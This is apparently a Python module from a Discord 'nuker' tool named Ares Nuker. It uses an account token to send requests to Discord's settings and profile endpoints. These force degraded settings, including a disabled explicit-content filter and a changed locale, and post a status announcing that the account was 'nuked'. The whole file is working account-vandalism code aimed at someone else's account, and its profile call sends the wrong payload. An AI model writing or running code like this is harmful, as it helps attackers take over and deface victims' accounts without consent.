__import__('sys').path.append('../')
import global_vars, requests, json
from AresNuker import Console


console = Console()
headers_account = global_vars.headers_account
config = global_vars.config

setting = {
          'theme': "light",
          'locale': "ja",
          'inline_embed_media': False,
          'inline_attachment_media': False,
          'gif_auto_play': False,
          'enable_tts_command': False,
          'render_embeds': False,
          'render_reactions': False,
          'animate_emoji': False,
          'convert_emoticons': False,
          'message_display_compact': False,
          'explicit_content_filter': '0',
          "custom_status": {"text": "Ares Nuker nuked this account <3"},
          'status': "idle"
}
bio = {
	'bio': '> Ares Nuker On Top :3\n> Made by _0xfc\n> Not public!'
}
def SetWorstSettings() -> None:
	try:
		requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers_account, json=setting)
		requests.patch("https://discord.com/api/v9/users/@me/profile", headers=headers_account, json=setting)
		console.log('Set worst account settings')
	except:
		console.error('Unble set worst account settings')